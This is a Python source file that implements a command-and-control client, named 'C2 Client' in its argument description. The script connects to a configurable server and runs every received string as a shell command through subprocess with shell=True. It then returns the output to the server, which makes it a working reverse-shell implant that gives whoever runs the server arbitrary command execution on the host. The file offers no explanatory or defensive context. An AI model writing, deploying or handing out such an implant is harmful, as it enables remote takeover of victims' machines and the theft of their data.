import socket
import argparse
import subprocess

def start_client(server_host, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))
    print(f"Connected to server {server_host}:{server_port}")

    while True:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break

        try:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = output.communicate()
            result = stdout if stdout else stderr
        except Exception as e:
            result = str(e).encode()

        client.send(result)

    client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start C2 Client')
    parser.add_argument('--server-host', default='127.0.0.1', help='Server host (default: 127.0.0.1)')
    parser.add_argument('--server-port', type=int, default=12345, help='Server port number (default: 12345)')
    args = parser.parse_args()

    start_client(args.server_host, args.server_port)
